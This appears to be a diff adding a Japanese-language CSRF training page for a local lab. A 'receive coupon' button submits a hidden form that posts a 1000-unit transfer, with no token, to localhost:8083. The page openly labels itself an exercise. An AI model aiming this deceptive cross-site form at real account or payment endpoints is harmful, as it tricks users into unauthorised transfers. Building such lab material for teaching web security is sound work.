@@ -1,0 +1,5 @@
+<!doctype html><html lang="ja"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>演習用の攻撃ページ</title>
+<style>body{font:16px system-ui;padding:32px;color:#253c3a;background:#fff8e9}button{padding:15px;background:#b64e23;border:0;border-radius:8px;color:white;font:inherit}iframe{width:100%;height:280px;border:1px solid #d6c7a8;margin-top:24px}</style>
+<h1>クーポンを受け取る</h1><p>このボタンは別オリジンの口座へ、トークンなしの送金リクエストを送ります。</p>
+<form action="http://localhost:8083/" method="post" target="attack-result"><input type="hidden" name="amount" value="1000"><button>クーポンを受け取る（演習）</button></form>
+<iframe name="attack-result" title="送金リクエストの結果"></iframe></html>
